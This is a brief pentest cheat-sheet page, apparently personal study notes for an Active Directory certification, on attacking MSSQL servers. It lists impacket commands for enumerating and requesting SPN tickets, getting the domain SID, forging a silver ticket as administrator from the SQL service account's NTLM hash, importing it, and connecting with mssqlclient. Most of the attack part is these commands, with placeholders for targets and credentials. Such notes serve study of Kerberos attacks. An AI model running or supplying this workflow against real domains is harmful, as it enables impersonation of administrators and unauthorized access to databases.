# MSSQL

### **Enumerate MSSQL**

Let's check if there are users with SPNs on the found MSSQL servers

```bash
impacket-GetUserSPNs <DOMAIN MACHINE>/<USER>:<PASSWD>
```

<figure><img src="../.gitbook/assets/Pasted image 20230830104754.png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
IMPACKET-GetUserSPNS -target-domain <DOMAIN> <DOMAIN MACCHINE>/<USER>:<PASSWD>
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20230830110943.png" alt=""><figcaption></figcaption></figure>

### **Silver Ticket Attack**

To perform the silver ticket attack against the SQL service we need three things:

1. The NTLM hash of the password of the SqlSvc account. (TGT?)
2. The domain SID.

{% code overflow="wrap" %}
```basH
impacket-getPac -targetUser <USER> <DOMAIN>/<USER>:<PASS>
```
{% endcode %}

3. The SPN that the SqlSvc account is using.

{% code overflow="wrap" %}
```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -k -dc-ip <DC> -no-pass -request
```
{% endcode %}

We can now proceed to obtain the silver ticket

{% code overflow="wrap" %}
```bash
impacket-ticketer -spn <User>/<Machine> -nthash <sqlsvc NTLM hash> -domain-sid <SID> -domain <Domain> administrator
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20230621120729.png" alt=""><figcaption></figcaption></figure>

Import the ticket

```bash
export KRB5CCNAME=administrator.ccache
```

If everything works with klist, you should see this

<figure><img src="../.gitbook/assets/Pasted image 20230621121052.png" alt=""><figcaption></figcaption></figure>

Connect to the machine

```bash
impacket-mssqlclient -k <macchina>
```

### crtp things
